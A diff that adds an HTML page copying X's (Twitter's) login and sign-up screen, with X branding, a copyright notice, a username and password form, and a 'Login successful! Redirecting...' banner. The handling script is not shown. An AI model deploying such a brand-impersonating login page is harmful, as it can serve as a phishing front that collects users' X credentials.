@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X. It's what's happening / X</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">
+                <i class="fab fa-x-twitter"></i>
+            </div>
+            <div class="background-image"></div>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-container">
+                <!-- X Logo -->
+                <div class="x-logo">
+                    <i class="fab fa-x-twitter"></i>
+                </div>
+                
+                <h1 class="heading">Happening now</h1>
+                <h2 class="subheading">Join today.</h2>
+                
+                <!-- Sign Up Buttons -->
+                <div class="button-group">
+                    <button class="btn btn-google">
+                        <i class="fab fa-google"></i>
+                        Sign up with Google
+                    </button>
+                    <button class="btn btn-apple">
+                        <i class="fab fa-apple"></i>
+                        Sign up with Apple
+                    </button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button class="btn btn-create" id="createAccountBtn">
+                        Create account
+                    </button>
+                    
+                    <p class="terms">
+                        By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+                    </p>
+                </div>
+                
+                <!-- Login Section -->
+                <div class="login-section">
+                    <h3>Already have an account?</h3>
+                    <button class="btn btn-login" id="signInBtn">
+                        Sign in
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Footer Links -->
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Download the X app</a>
+                <a href="#">Help Center</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Cookie Policy</a>
+                <a href="#">Accessibility</a>
+                <a href="#">Ads info</a>
+                <a href="#">Blog</a>
+                <a href="#">Status</a>
+                <a href="#">Careers</a>
+                <a href="#">Brand Resources</a>
+                <a href="#">Advertising</a>
+                <a href="#">Marketing</a>
+                <a href="#">X for Business</a>
+                <a href="#">Developers</a>
+                <a href="#">Directory</a>
+                <a href="#">Settings</a>
+                <div class="copyright">© 2023 X Corp.</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal">
+            <div class="modal-header">
+                <button class="modal-close" id="closeModal">
+                    <i class="fas fa-times"></i>
+                </button>
+                <div class="modal-logo">
+                    <i class="fab fa-x-twitter"></i>
+                </div>
+            </div>
+            
+            <div class="modal-body">
+                <h2 class="modal-title">Sign in to X</h2>
+                
+                <div class="modal-buttons">
+                    <button class="btn btn-google-modal">
+                        <i class="fab fa-google"></i>
+                        Sign in with Google
+                    </button>
+                    <button class="btn btn-apple-modal">
+                        <i class="fab fa-apple"></i>
+                        Sign in with Apple
+                    </button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder="Phone, email, or username" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                        <button type="button" class="show-password" id="showPassword">
+                            <i class="far fa-eye"></i>
+                        </button>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-login-modal">
+                        Sign in
+                    </button>
+                    
+                    <div class="form-footer">
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                        <p class="signup-link">
+                            Don't have an account? <a href="#" id="signupLink">Sign up</a>
+                        </p>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Success Message -->
+    <div class="success-message" id="successMessage">
+        <i class="fas fa-check-circle"></i>
+        <span>Login successful! Redirecting...</span>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
